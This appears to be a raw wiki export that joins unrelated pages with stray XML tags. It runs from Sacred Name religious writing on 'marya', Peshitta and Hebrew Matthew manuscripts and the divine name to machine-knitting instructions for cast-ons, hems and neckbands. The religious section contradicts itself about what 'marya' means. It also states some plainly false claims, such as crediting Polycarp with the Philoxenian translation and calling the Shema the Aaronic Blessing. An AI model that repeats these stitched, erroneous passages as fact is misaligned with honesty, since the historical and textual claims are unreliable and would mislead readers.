These persons have claimed that '''''marya''''' means Yahweh or Lord Yahweh. Actually this word is strongs# 4806, which means a fattened animal which is ready for sacrifice. This was a title given to our Messiah because he was the '''''marya''''' prophesied of. This is a title used for Yeshua (Jesus) in the Aramaic Peshitta translation in Philippians 2:11. If this is the true translation of this scripture then It would have read: &quot;And that every tongue should confess that Yeshua(Jesus) was the anointed '''''marya''''', to the glory of Yahweh the Father&quot;. In other words he is the anointed sacrifice as written in the Law of Yahweh. The list of scriptures where you can find this word used is below:

      <text xml:space="preserve">==MANUSCRIPT EVIDENCE OF THE NAME==
Hebrew, and Aramaic were held in equal esteem, among the Jews, Hebrew being used mainly for the Biblical texts themselves, and Aramaic being used for the Talmud, and other legal treatises.  We know from early writings that Matthew's gospel was in Hebrew as may have been some of the others, and then later translated in to first Galilean, and then Assyrian Aramaic, and afterwards, into Greek, Latin, and other European Languages.
    
The request for Mark to write a gospel was made by Greek speaking people and as he travelled into Greek-speaking areas with the apostles, it could have been originally written in Greek.

==HEBREW MANUSCRIPTS==
Jerome (331-420 C.E.) says that &quot;Matthew first composed a Gospel of Messiah in Judea for the benefit of the Jewish believers, in the Hebrew tongue and character. Today we have several copies come down to us from what is believed to be the original of that gospel.

The 'DuTillet' Hebrew manuscript of Matthew repeats the Hebrew letter YUD two or three times in a circle so as to mark places where the name of YHWH should go. 

The 'Shem Tob'  Hebrew version of Matthew has the Hebrew letter HEY standing alone (and in one place the word HASHEM spelled out) to mark places where the name of YHWH belongs. 

The 'Munster'  Hebrew text of Matthew actually contains the name of YHWH spelled out where it belongs. 

==THE ARAMAIC MANUSCRIPTS==
The Scriptures in the Church of the East, from the inception of Christianity to the present day, are in Aramaic and have never been tampered with or revised, as attested by the present Patriarch of the Church of the East. The Biblical manuscripts were carefully and zealously handed down from one generation to another and kept in the massive stone walls of the ancient churches and in caves. They were written on parchment and many of them survive to the present day. When these texts were copied by expert scribes, they were carefully examined for accuracy before they were dedicated and permitted to be read in churches. Even one missing letter would render the text void. Easterners still adhere to God's commandment not to add to or omit a word from the Scriptures. 

Some of these ancient manuscripts go back to the 5th century A.D. The oldest dated Biblical manuscript in the world is that of the four Books of Moses  (Pentateuch), 464 A.D., which now lies in the British Museum. Another one is the Codex Ambrosianus. Some of it goes back to the 7th century, some of it to the 5th century, and some of it might be earlier - possibly created about 150-250 AD. This Codex is not the work of one man. Apparently some portions were written before the vowel system was invented and that would put it prior to the 5th century. The Pentateuch in the British Museum must have been written before the vowel system was invented. Aramaic documents of the 5th century and later use the vowel system, some of them fully and some in part. 

It is interesting to know that this vowel system was adopted by the Jews and was begun about the 541 A.D. In some portions of the above texts, the old Aramaic original consonantal spelling without apparatus of vowel points is well preserved. This is also true of some of the Aramaic New Testament texts in the Pierpont Morgan Library, New York City which attests to their antiquity.
Something not achieved in the Greek and Hebrew manuscripts is that all the 'Peshitta' texts in Aramaic in various locations in the east are in agreement. This attests to the accuracy of the copyists and that they came from a common source before they were distributed into the various areas.

The late Mar-Yacob (Jacob) Eugene Manna, Chaldean Roman Catholic Metropolitan of Armenia, a distinguished Aramaic scholar whose writings are in Aramaic, says that the text which is called the 'Peshitta' is without dispute even earlier than the writings which came down from the works of Bar-Dasan, who was living in the latter part of the second century. He also states that the Aramaic speech in Mesopotamia was richer and purer than the Aramaic speech of other regions.  The Greek and Latin translators made literal translations of the Scriptures, keeping the Semitic rhythm and sentence structure.

The term 'Peshitta' means straight, simple, sincere and true, that is, the original. This name was given to this ancient and authoritative text to distinguish it from other Bible revisions and translations which were introduced into some of the Churches of the East (Monophysites) after the division at Ephesus and Chalcedon in 431 and 451 A.D., respectively. This ancient Peshitta is still the only authoritative text of the Old and New Testament of all Eastern Christians in the Near East and India, the Church of the East, the Roman Catholic Church in the East, the Monophysites, and Indian Christians. This is because this text was in use for 400 years before the Christian Church was divided into several sects.  The Peshitta is the oldest known collection of the New Testament scriptures which at first excluded some of the Pastoral epistles   (them not having as yet been collected).   
Aramaic remained a language of Jews living in the diasporia as proven by copies in the east and in Rome of the Old Testament.

The Old Syriac, Peshitta and Crawford Aramaic manuscripts of NT books distinguish between YHWH (Yahweh) and ADON/ADONAI (Lord). These Aramaic manuscripts have Aramaic MARYA for YHWH and Aramaic MAR (MARI or MARAN) for ADON/ADONAI. 

The original Greek Canon was based on this and would have included the Name.

==THE GREEK MANUSCRIPTS==
John Trobisch in his research has formulated evidence of an archetypal complete Endredaktion or &quot;Canonical Edition&quot; of the New Testament consisting of the twenty-seven books parallel to the modern editions and translations of the New Testament. This Canonical Edition, written completely in Greek, was the product of a careful and deliberate editorial process and was completed as early as the middle of the second century CE.  According to Trobisch, this text became widely accepted  among Christians of the day and became the archetype for all subsequent copies of the New Testament throughout the Mediterranean.

The earliest manuscripts do not have &quot;Theos&quot; (God)  or &quot;Kurios&quot; (Lord)  in them.  Instead they have 2-letter codes called &quot;Nomina Sacra&quot;, which are abbreviations for those common titles.  This bears some resemblance to the handling of the Sacred Name with substitute markers, as has been observed in other OT manuscripts.   
 
One of the most important types of evidence that the Name was in the original text is the extensive presence of 'nomina sacra' (markers for sacred names to replace them), in the New Testament manuscripts. What is obvious is that the usage of these is not consistent and indicates that the notation of sacred names where they had occurred does not appear to have originated with authors of the autograph texts, their presence reflects &quot;a conscious editorial decision made by a specific publisher&quot;

The removal of the Tetragrammaton from the NT and its replacement with the Greek surrogates blurred the original distinction between the Sacred Name and Messiah being referred to as Lord, and in many passages made it impossible to tell which one was meant. This is supported by the fact that in a number of places where the &quot;Old Testament&quot; quotations are cited, there is a confusion in the manuscript tradition whether to read God or Christ in the discussion surrounding the quotation.

The early scribes wrote the divine name in Hebrew in the Greek manuscript. Jewish Christians, however, seem to have rendered the Tetragram with kurioj (Lord). The problem came in when the New Testament writers had to distinguish between YHWH and &quot;Lord&quot;, and the usage of the &quot;nomina sacra&quot; was expanded to all the divine names and other sacred theological terms in the New Testament (God, Lord, Christ etc). 

Trobisch points out that the original codex was in fact known in the Roman world of the first century CE; Seneca mentions it, and Martial explicitly advertises its use for his own books (Epigrams 1.2) and encourages readers to find codices for other Classical authors. Lawyers and doctors also made use of the codex as a kind of reference notebook designed for consultation. Because of their extensive practice of citing and searching for proof-texts, early Christians found this ease of reference particularly attractive.

This practice of using 'markers' to replace the Sacred Name of Yahweh  agrees with the practice of replacing &quot;Marya&quot; in the Syriac and Aramaic Texts.
The versions translated from Semitic languages into Greek and Latin were subject to constant revisions. Learned men who copied them introduced changes, trying to simplify obscurities and ambiguities which were due to the work of the first translators. Present translators and Bible revisers do the same when translating the Bible today. The earliest manuscripts that we have are from the fourth century.
 
Established Grammatical Rules for Restoring the Name From the Greek Text:
1. If there is an Old Testament quote, the Names and Titles will be restored as they appear in the Old Testament.
2. Where 'kurios'  (Lord) stands alone in the Greek with no definite article in front of it, it will be translated as Yahweh.
3. Where 'kurios' is preceded by a definite article - i.e. 'the', then it will be translated as &quot;Master&quot; or &quot;Lord&quot;.
4. If 'theos' (God) is preceded by a definite article, it is taken as a title  i.e. &quot;the Almighty&quot;.
5. If 'theos' is not preceded by a definite article, it is taken to be the Name of Yahweh.

To determine this in the English version a literal translation will be necessary. -  from research by Michael Banak

==RECORDED EVIDENCE OF MANUSCRIPTS CONTAINING THE NAME==
Early Nazarenes   As attested to by the Talmud, the early Hebrew believers used scriptures that contained the Name.

They used a copy of a gospel written by Matthew in Aramaic.
Aquila 128 AD Aquila of Pontus, translated the Old Testament into Greek.   He was born in Sinope, Pontus (now Sinop, Turkey). His translation of the Old Testament was so literal that Jews of his time preferred it to the Septuagint version, as did the Judaistic sect of Christians called Ebionites. The remaining fragments of the version may be found in the Hexapla of the Alexandrian theologian Origen.  His Greek version contained the Tetragrammaton in archaic Hebrew - i.e.  the Paleo script.

Matthew's gospel is generally agreed to have originally been written in Hebrew and contained the Tetragrammaton. (the Divine Name).  Copies of this gospel remained among Jewish Christian communities of Israel/Palestine and Syria.  Justin Martyr, Irenaeus, Clement, Origen, Jerome and Eusebius possessed copies of it and quoted it.

Polycarp   of Smyrna early 2nd century made a translation of the Hebrew scriptures now called the Philoxenian.   Polycarp was a disciple of the apostle John and therefore would also have used the divine Name.

Origen in AD 245   Produced the 'Hexalpa' using the Hebrew letters for the Tetragrammaton in the Hebrew version and the equivalent letters in the Greek version.

Jerome said that there was an original copy of the &quot;Hebrew&quot; gospel preserved in the library at Caesarea which was collected by the martyr Pamphilus.  He copied it and translated into Greek from the Aramaic.  He said that ignorant readers mistook the Tetragrammaton (in this text) to be a Greek word &quot;pipi&quot;

The Jewish Talmud and the Tosefta  (ancient Jewish writings -  t.Shab. 13:5; b.Shab. 116a; j.Shab. 15c), bore statements that there were Hebrew texts (New Testament) that contained the Divine Name.

The Talmud also accused Yeshua of performing miracles by pronouncing the Divine name, therefore giving evidence of the fact that it was used by Yeshua Himself and therefore by His disciples, the apostles. It is therefore logical that if they used the Name in everyday language, they would also have written as they spoke.

==THE NAME IN THE KING JAMES VERSION TRANSLATION==
Generally the Name of Yahweh (the Tetragrammaton) has been translated into English in the Old Testament by &quot;LORD&quot; in block capitals by the original translators. Where it is written as &quot;Lord&quot;, in the original manuscript it is &quot;Adonai&quot; which literally means &quot;Lord&quot;.

However in the following instances the translators took the liberty to alter the way they translated the divine Name from Yahweh to Lord  i.e.  -  &quot;LORD&quot; to &quot;Lord&quot;.   Those occasions where it appears as 'Lord' instead of 'LORD' are as follows  -

*Genesis 18: 3, 27, 30, 32;  19:18;  20: 4

*Exodus 4:10, 13;  5:22;  15:17;  34: 9 (twice)

*Numbers 14:17

*Joshua 7: 8

*Judges 6:15;  13: 8

*1 Kings 3:10, 15;  22: 6

*2 Kings 7: 6; 19:23

*Ezra 10: 3

*Nehemiah 1: 11;  4:14

*Job 28:28

*Psalm 2: 4;  16: 2;  22:19,30;  30: 8;  35:17, 22;  37:12;  38: 9,15,22;  39: 7;  40:17;  44:23;  51:15;  54: 4;  55: 9;  57: 9; 59:11;  62:12;  66:18;  68:11, 17, 19, 22, 26, 32;  73:20;  77: 2, 7;  78:65;  79:12;  86: 3, 4, 5, 8, 9, 12, 15; 89:49, 50;   90: 1,17;  110: 5;  130: 2, 3, 6

*Isaiah 3:17,18;  4: 4;  6: 1, 8, 11;  7:14, 20;  8: 7;  9: 8, 17;  10:12;  11:11;  21: 6, 8, 16;  28: 2;  29:13;  30:20;  37:24; 38:14, 16;  49:14

*Lamentations 1:14, 15 (twice);  2: 1, 2, 5, 7, 18, 19, 20;  3:31, 36, 37, 58

*Ezekiel 18:25, 29;  21:13;  33:17, 29

*Daniel 1: 2;  9: 3, 4, 7, 9, 15, 16, 17, 19 (three times)

*Amos 5:16;  7: 7, 8;   9: 1

*Zechariah 9: 4

*Micah 1: 2

*Malachi 1:12, 14
:(Massorah 107 -15  Ginsburg edition)

These instances can be corrected to read as &quot;Yahweh&quot; the same as every instance where &quot;LORD&quot; occurs in our present King James Bible. 
The New King James follows the Old King James version in this regard.

      <text xml:space="preserve">==PROPHECIES FULFILLED IN YESHUA==
&quot;And it shall come to pass, that whosoever shall call on the name of Yahweh shall be saved,&quot; Acts 2:21, quoted from Joel 2:32.   -     	
&quot;And it shall come to pass, that whosoever shall call on the name of Yahweh shall be delivered: for in mount Zion and in Jerusalem shall be deliverance, as Yahweh hath said, and in the remnant whom Yahweh shall call,&quot;   Joel 2:32. 
This was fulfilled in Yeshua as the representative on earth of the godhead,  &quot;Yahweh&quot;.

You can see that when you call on the Name of Yeshua, you are indeed calling on the Name of Yahweh, who is salvation.    Isaiah 43:11

&quot;This is the stone which was rejected by you builders, which has become the chief cornerstone.  Nor is there salvation in any other, for there is no other name under heaven given among men by which we must be saved.&quot; (Acts 4:11, 12).    In saying this, Peter quotes Psalm 118:22:
&quot;The stone which the builders rejected has become the chief cornerstone&quot;, which goes on in verse 26,   &quot;Blessed is he who comes in the name of Yahweh!&quot;

Paul also quotes from the same passage in Joel as Peter in Acts 2:21,  &quot;For whosoever shall call upon the name of Yahweh shall be saved,&quot; Romans 10:13, and also from Isaiah,
&quot;Behold I lay in Zion a stone for a foundation, a tried stone, a precious cornerstone, a sure foundation;  he who believes shall not make haste.&quot;	   Isaiah 28:16   (&quot;will not be put to shame.&quot; Romans 10:11)

&quot;And they that know Your name will put their trust in You: for You, Yahweh , have not forsaken them that seek You,&quot; Psalm 9:10.

Yeshua is the tried cornerstone of the spiritual House of Yahweh who came in the Name of Yahweh to bring salvation to all who call upon that name. He came in His Fathers' Name,  His given Name &quot;Yeshua&quot;, means 'Yahweh is salvation&quot;.  To us, He is  &quot;Yahweh our Righteousness&quot;.

==THE NAME OF YESHUA AUTHORISED==
&quot;But as many as received him (Yeshua), to them gave he power to become the sons of God, even to them that believe on His name.&quot; John 1:12.
In Hebraic culture a name has great significance in describing the character/personality of the person named.

Whenever Yeshua's Name was said, its meaning &quot;Yahweh is salvation&quot; would come to mind. He carried His Father's name and His Father's messianic appointment in His given name of &quot;Yeshua&quot;. He Himself said that He did not come in His own Name, but in the Father's.   John 5:43

Paul says that because He humbled Himself and became obedient to the purpose of dying for lost humanity as the substitute Lamb,  that the Father had given Him a name above every name, quoting from Isaiah 45 -
&quot;I have sworn by Myself (Yahweh speaking)  ..  ..  That to Me every knee shall bow, every tongue shall take an oath.&quot;   Isaiah 45:23

He has been enthroned and entitled to have power and authority over all named authority and power in this age and in the coming age of the kingdom.  Ephesians 1:17-23

This is the inheritance given Him by the Father as our Great High priest,   He has &quot;by inheritance obtained a more excellent name&quot;  than any other spiritual power.   Hebrews 1: 4   

But note that it does not exclude the Father's Name. It is qualified as the &quot;Name under heaven given among men by which we must be saved&quot;   Acts 4:12
But, &quot;O Yahweh, your Name is forever, O Yahweh, your remembrance to all generations,&quot; Psalm 135:13.

&quot;His name shall endure for ever: His name shall be continued as long as the sun: and men shall be blessed in him: all nations shall call him blessed,&quot; Psalms 72:17-19.

==EARLY BELIEVERS AND THE NAME==
The scripture records that the believers healed, cast out spirits and did many wonderful works by the Name and authority of  Yeshua our Lord and Messiah, and souls were saved in His Name.  Matthew 10:1, 5-8

The early Assembly was not a separate unit from the Jews until after the Jewish revolt in 135 AD. Even those of the dispersion and the 'Gentiles' remained attached to the synagogue life as much s possible. Thus although the Name of Yeshua was used in ministry, the believers did not begin to call themselves after His Name until quite some time later.

At first they were known as followers of &quot;the Way&quot;   Acts 9:2; 19: 9,23, 22:4; 24:14,22  and they were first known as Christians (our terminology) or Messianics (Messiah-in believers),  in Antioch - Acts 11:26.

Although the sacred Name was not used by the Jewish sector, the Name of Yahweh is intended to be used by His people (Deuteronomy 28:10), and He says that His Name is to be a memorial for ever - Exodus 3:15

Yeshua always instructed prayer to be made to the Father, as He Himself also prayed.  John 12:27; 16:23-24

Worship is to be directed to the Father,  &quot;O magnify Yahweh with me, and let us exalt his name together,&quot;  Psalms 34:3.

God is now revealing His true Name to the end-time saints,  and we should USE it in a HOLY, godly, pure, and reverential manner - to WORSHIP HIM with all our hearts, mind, soul, and strength to praise and glorify HIS NAME!    Also, it is to be used in prayer to Him  (Matthew 6: 9). Every day we should pray, without substitution of any other names, the proper name of God.  We should remember the Shema (Aaronic Blessing), as He commanded,  
&quot;Hear, O Israel, Yahweh our God, Yahweh is One!
You shall love Yahweh your God with all your heart, with all your soul, and with all your strength. And these words which I command you this day shall be in your heart.”  (Deuteronomy 6: 4-7).

==RESTORATION OF TRUTH==
Daniel the prophet was told, “But you, Daniel, shut up the words, and seal the book until the time of the end; many shall run to and fro, and knowledge shall be increased” (Daniel 12: 4).    

“Many shall be purified, made white, and refined, but the wicked ..  .. ..  but the wise shall understand”  (Daniel 12:10).

There is to be a revelation of His Name to His people before His return, as part of the restoration of all truth to His Body for them to come to the fullness of Messiah. Ephesians 4:13-15

Psalm 91 promises deliverance to those who know and call upon the Name of Yahweh in the time of end time persecution - &quot;Because he has set his love on Me, therefore I will deliver him: I will set him on high because he has known My Name.&quot; (verse 14)  Knowing His Name in covenant relationship is entering the secret place of the Most High, in bridal intimacy, &quot;a place better than that of sons and daughters&quot;  v.5 -Isaiah 56: 4-7

&quot;Then I looked, and behold, a Lamb standing on Mt. Zion, and with Him one hundred and forty-four thousand, having His Father's Name written in their foreheads.”  Revelation14: 1 (NKJV)

&quot;And they shall see His face; and His Name shall be in their foreheads , ...&quot; Revelation 22:4

There is going to be a people in these last days whom He will stamp with His mark of approval in identification with the Father's Name. He identifies His end-time people along with those of the early period of the nation, as those exhorted to call upon His Name -   Again in Joel 2:32, although applied to salvation in regard to Yeshua's work on the Stake, its full application is for the last days, “The sun shall be turned to darkness, and the moon into blood, before the great and awesome day of Yahweh. And it shall come to pass that whoever calls on the Name of Yahweh shall be saved, for in Mount Zion and in Jerusalem there shall be deliverance, as Yahweh has said, 'Among the remnant whom Yahweh calls'”

Yahweh says that it is part of the restoration of His people that His Name will again be sanctified in their midst (verse 23 of Ezekiel 36:17-28)    
This is speaking of the end of the age.

He said,  &quot;I will show my greatness and my holiness and make myself known in the sight of many nations. Then they will know that I am Yahweh.&quot;    Ezekiel 38:23  Also Psalms 72:18-19.

The prophets speak of an end-time restoration of His people, the two houses of Israel, and part of that restoration will be knowing His Name.  Ezekiel 36:17-25 (note v.23); Hosea 2:19-20; Micah 4: 5; Zech. 13:7-9

&quot;Who shall not fear you, O Yahweh, and glorify Your Name? for You only are holy: for all nations shall come and worship before You; for Your judgments are made manifest,&quot; Revelation 15: 4. 

==THE KINGDOM AGE==
&quot;Many nations shall come and say, 'Come, and let us go up to the mountain (kingdom) of Yahweh,&quot;  verse 2 of Micah 4: 1-5;  Isaiah 2: 1-3,  see  also Malachi 1:11

&quot;So shall they fear the Name of Yahweh from the west, and His glory from the rising of the sun;&quot; Isaiah 59:19 &quot;They shall come,  and seek Yahweh their God.   They shall ask the way to Zion .. .. ..  &quot;Come let us join ourselves to Yahweh in a perpetual covenant that will not be forgotten&quot;&quot;   Jeremiah 50: 4-6

&quot;In that day you shall say: 'Praise Yahweh, call on His Name; declare His deeds among the peoples,  make mention that His Name is exalted.  Sing to Yahweh, for He has done excellent things; this is known in all the earth. Cry out and shout, O inhabitant of Zion, for great is the Holy One of Israel in your midst.&quot;    Isaiah 12: 4,6

Yeshua said, “For I say unto you, you shall see Me no more till you say , 'Blessed is He who comes in the Name of Yahweh'”   Matthew 23:39
&quot;For the Son of Man will come in the glory of His Father with His angels&quot;   Matthew 16:27; 25:31

&quot;A King shall reign and prosper, and execute judgment and righteousness in the earth. ..  ..  .. Now this is His Name by which He will be called:  Yahweh our Righteousness  (YHWH Tsidkenu)&quot;  Jeremiah 23: 5-6 

&quot;And Yahweh shall be king over all the earth: in that day it shall be -- Yahweh is one,  and His Name one.&quot;   	Zechariah 14: 9

This is the time of the complete fulfillment of the new covenant  when the earth shall be full of the knowledge of Yahweh.   Jeremiah 31:34; Habakkuk 2:14

==THE KINGDOM RESTORED TO THE FATHER==
Ultimately, Yeshua will submit His authority to the Father. 
When He has put down all insurgent rule and authority and His commission is complete, He also will become subject to the Father, so that He, the Father may be all in all.   1 Corinthians 15:24-28

Paul reveals that the family of the Most High will be called by the Father's Name.

He said, &quot;I bow my knees to the Father of our Lord Yeshua the Messiah, from whom the whole family in heaven and earth is named,&quot; Ephesians 3:14-15   (not named after Yeshua)

And in the New Jerusalem we see the glory of God filling it through the Lamb (Revelation 21:23), and they who dwell in that dimension of light, shall see His face and they are identified as having His Name on their foreheads, the Name of Yahweh.   Revelation 22: 4; 7: 3; 14: 1

      <text xml:space="preserve">=Edges=
==Casting on edges on a single bed apparatus==
===Cast on edges without ribbing===
You can make a finished edge by twisting the yarn once round the needles. Do not make the loops too tight. However you do not do that very often, as you usually begin with a hem.

===Cast on with weaving brushes===
Set the weaving pattern levers. Bring every other needle into the knitting position and every other needle in resting position but so that they are taken down on the next row.

Thread the yarn and lay it over the needles in the resting position, and fasten it to the first and last needle by twisting it round them. Hold the end of the yarn while you are knitting the first row. Make a few rows before you release the weaving brushes.

===Casting on with a thread through the open loops.===
Bring the needles into the knitting position and every other needle into the resting position. Set the button for idling position. Place a nylon thread or other smooth thread inside the gate. Set the tension dial to 0. Hold both ends of the nylon thread while knitting the first row. The needles in the resting position go down. Adjust the tension dial to the required number and make a few rows before you draw out the nylon thread.

You can use this method if you want to knit a rib by hand. Do not begin with the rib, as maybe you will not be able to stretch it far enough to the required needle number. The thread going through the loops is holding them, so just draw it straight. Notice that every other stitch to be picked up is turned.

===Cast on beginning with a hem===
This is easiest if you have a casting-on comb. Bring the needles into the knitting position and every other in the resting position. Hang the comb on the gate pegs and set the idle button. Knit the first row with the tension dial on 0. Release the comb from the gate pegs and pull it down. Adjust the tension dial to one or two numbers lower than the rest of the garment. Make twice as many rows as required for the height of the hem. Then bring every other needle into the resting position again and hang the loops from the comb on these. You can use one or both extension rails to lay inside the hem to avoid the stitches falling off. Adjust the tension dial and go on knitting.

This hem is likely to roll although you make it high. It helps a little if you begin with a high number on the tension dial and gradually go down to where it starts to bend, and then gradually go up again. However, there is another way to do it. Cast on with every other needle with half of the required number on the tension dial, until half way along of the back side of the hem, and then bring all needles into the knitting position and the tension dial to the right number and make the rest of the hem. A row of holes will come where you added the rest of the needles, but it will be on the wrongside. In this way the hem will not roll. You can also add the rest of the needles where the hem is going to fold down, if you want a mouse-tooth edge.

===Fake rib===
Make a hem in the same way but only use every other needle and half the tension dial number for the whole hem. When you have finished the hem add the rest of the needles and hang the loops on the opposite needles. Adjust the tension dial. Do not make the hem too small.

===Casting on with very fine yarn===
If you use very fine yarn, you may prefer to sew a hem after having finished the garment. Then you may secure the open loops with tape, or just with a zigzag before you hem it.

Lay the fine knitting bar inside the gate and hang the comb on the gate pegs. Begin with a fairly high number on the tension dial and use all needles. Lay the nylon thread inside the gate. Knit one row. Set the tension dial at the very lowest number and knit a few rows to secure the first row. Adjust the tension dial to the required number. After some rows you can pull out the nylon thread and carry on.

==Casting on with the ribber==
You can either cast on with two rounds of circular knitting as described in all instruction books, or you can do it by racking the needles, if you want an elastic border, say for socks.

Bring the needles up for 1/1 knitting (1 knit, 1 purl) while the racking grip handle stays at 5. If the last needle on the plain knitter is on the left side, you shift to 3 at the racking grip and if the last needle is on the right side, you shift to 7. Make one row, hang the comb and weights in and shift back to 5. Then go on knitting.

===Casting on for 2/2 knitting===
Bring the needles in position for 2/2 knitting (2 knit, 2 purl) while the racking grip stays at 5.

Shift 1½ number to the side where the outermost needles on the plain knitter are.
Knit one row, hang in the comb and weights, do two rows of circular knitting, and shift back again. You can leave out the circular knitting, but then you will end with one needle on each side.

===Knitting with every other needle===
You may cast on as usual with every other needle and use a bigger stitch size. When you transfer the stitches to the single bed you must place them on needles which already have stitches. However, you can also use every third needle on both needle beds; then you must move the racking grip handle half a number. You cannot transfer the stitches, so you had better make the ribber after you have finished the garment and allow excess yarn. Then place the garment on the machine with the rightside out and the ribbing over it and cast off both pieces at the same time.

===Casting on by hand===
If you want the beginning to look as if you have knitted it by hand, you can make a finished casting on at the single bed and then knit one row. Connect the ribber and transfer every other stitch to that, let down the ribber half way, and place the comb carefully. It must only go between the stitches, not inside them. Push up the ribber again, hang weights on and go on knitting. This way of doing it takes more time, but it looks nice. In any case, this is for experienced knitters.

===Casting on with fine yarn===
If you are using fine yarn and use a stitch size less than 5, you cannot make the ribber with every other needle, as that will be too loose. Do not knit the ribber until you have finished the garment. Afterwards you can make a rib using each needle and half of the needle number that you used for the jumper. Be sure to use a stitch size that is big enough, so the knitting can be stretched to the double width. Make the last row in a bigger stitch size. Knit a few rows with contrast coloured yarn, and cut the yarn off. Release the knitting by pushing the carriage over it. Now you can hang the casting on loops from the jumper with the rightside out on the machine. Place the stitches from the rib underneath the contrast colored yarn, and avoid pulling them behind the latches, but leave them on the hooks. Unravel the contrast colored yarn. Then you can cast off both pieces at the same time.

Before you make the rib, you can do a little test to make sure that it can be stretched far enough. Cast on until needle number 12 in each side, for example, and hang on the side hooks instead of a comb and hang a little weight through the two holes in the hooks. Make about 20 rows, and afterwards a few rows of contrast coloured yarn and release the knitting from the machine. Lay it on an ironing board and pull it so the circular rows are stretched. Pin it all the way round. Now you can see how far the rib can be stretched by measuring how many stitches there are per cm and how many rows you have to make.

This process takes a rather long time, but instead of making a rib, you can do some circular knitting with all the needles, perhaps a little tighter than the rest. Afterwards you transfer the stitches from the ribber to the back needle bed. This hem is also likely to roll, but not as much as if you made it on the single bed.

===Racking===
If you want a non-elastic border, you can rack the rib stitches. Cast on in 1/1 rib and do two rounds of circular knitting. Make one row and set the row counter on 4 (1 casting-on row + 2 rounds circular knitting + 1 row rib = 4). Turn the racking grip 1 number, whereby the needles shift their position. Knit 2 rows, and turn the grip back again and make 2 rows. Continue in this way until the border is high enough.
This edge is especially nice for the front border, and if you use that, it is nice to make the rib in the same way. It also has the advantage that you can count how many stitches there are per cm when you make the front border.

==Neckband for single beds==
You can either make the neckband when you have made the neckline, or you can end with contrast colored yarn and leave it until you have made both the front and the back, so that you do not need to have a seam in each side of the neckband. If you make a cardigan, it is nicer to make the neckband the whole way round, but if it is a jumper you can just as well have a seam in both sides, as you must have a seam in at least one side.

When you have made the neckline, you begin the neckband with the same size stitch or bigger than you used for the jumper. You gradually reduce the stitch size making 2 - 4 rows with each size until you reach size 1 or 0. Now you make one row at 10 and go down again to 1 or 0. Then enlarge the stitch size again in the same way until you reach the same stitch size as the first row, but knit the very last row on the largest stitch size. It is then easier to seam. End with a few rows of contrast coloured yarn, and release the knitting. Afterwards you iron it by covering it with a wet cloth, unless it is synthetic yarn, in which case you can moisten it or put the stitches on a knitting needle. You can iron it anyway if you are very careful not to hit the right side of the hem but only the last few rows of the inside. How you seam the open loops down, is described in the chapter about [[Machine_Knitting/Mounting|mounting]].

==Neckband with the ribber==
Begin with the same stitch size that you used for the ribber at the beginning of the jumper, maybe 3 or 4. It depends on how fine the yarn is, that you are using. Reduce the size gradually by 1/3 stitch size, and make 2 - 4 rows with each size until size 0 or even less if it is possible. Then you gradually enlarge the stitch size in the same way as you reduced it. You knit the last row on stitch size 5 or 6, so it is easier to seam down. End with contrast colored yarn and release the knitting from the machine. When you iron the neckband it is important not to stretch it, because then the stitches will be smaller and difficult to get rid of. Instead, you can iron them at both sides, so both the knit and purl stitches are ironed.

If you have only used every other needle for the sweater, you need not transfer every other stitch but just push up the needles at the ribber. You can use a smaller stitch size. A row of holes will appear, but it will not show very much because the purl stitches hide themselves.

Of course there are many other ways of finishing off a neck. For example, you can knit some rows of plain knitting and cast off. Then the edge will roll by itself. However, remember that the pattern is calculated with a 3 cm neck edge, so then the neck will be bigger, unless you add 3 cm to both the width and the depth.
If you knit a dress for a little girl and want to include a collar, you can simply cast off the neck as it is; it will not roll, because it is round. But remember that the pattern is calculated with a 3 cm neckband.

==Tapering neck==
On the back of the neck you use contrast coloured yarn. At the front you can begin tapering the neck at the same time as you begin to cast off for the armhole. It will be suitable if you decrease one stitch in the beginning of every third row. The angle will then be 25° vertical. You can seam one shoulder, and knit one side of the neckband and the back neck at the same time or you can make the three pieces by themselves.

===Single bed===
On the back neck you pick up the stitches behind the contrast coloured yarn, which you ravel off afterwards. On the sloping side you pick up the stitches one stitch from the edge. Pick up two stitches next to each other and pass over one stitch. It will be suitable if you have cast off for every third row for the tapering. In the same way as for the round neck you gradually reduce the stitch size, make one row on stitch size 10, and enlarge gradually again. Make the last row on stitch size 10. At the same time you cast off one stitch on the tapering side on every row (not only in the beginning of the row). At the backside of the hem make a stitch on the tapering side again on each row. Knit contrast coloured yarn and take off the knitting.

You sew the tapering together and afterwards you sew a row of chain stitches in the middle, so it looks like you have knitted it by hand and decreased one stitch on every side of the tapering. That must be done before you sew the seam down.

===With the ribber===
You do this in another way. You do not pick up stitches, but make the border separately. Measure the rib at the beginning and place it on an ironing board and stretch it, so that the circular knitting lies smooth. Measure the whole piece. Divide the number of stitches by the measurement of cm. Now you know how many rib stitches there are per cm. Measure the sloping sides of the neckline and multiply it by the number of stitches per cm. Now you know how much to cast on for the sloping sides. Count the stitches at the back neck. You have to make two pieces, one for the sloping side where you add the back neck stitches, and one for the other sloping side. You can also count the number of rows and decide how many rows you want for the neckband. You do not make the neckband double, but begin with two rounds of circular knitting and a low stitch size and enlarge it gradually to the stitch size you used beneath. Transfer the stitches to the single bed. Move the comb and weights. Place the neck edge with the wrong side out, and pick up first the end stitches, then the middle and continue to pick up in the middle until there are only a few stitches between them, so that you can distribute them yourself. Do not pull them behind the latches, but leave them on the hooks, otherwise it is difficult to cast off, which you do without making a row.

[[image:MachineKnittingFigMasks.gif|right]]
You sew together the tapering by catching half a knit stitch in each side, and next time you catch the stitch one row higher and two stitches aside, so you only use the knit stitches. Please look at the figure. In this way you will get the correct angle for the tapering. Two little seams are left on the backside. You can seam them down by hand and afterwards sew a row of chain stitches over the seam. &lt;br style=&quot;clear:both&quot; /&gt;

==Armholes==
If you have made a waistcoat, you want an edge round the armholes. You can make the armholes deeper, to make space for an edge. If you want a 3 cm wide edge, you can calculate 4-5 cm, because it will be sloped, as you sew it together in the same way as the tapering neck.

==Selvedges==
If you have made a cardigan with two front pieces, you may want an edge, unless you have made the pieces so wide, that you can make a double border.

===For single bed===
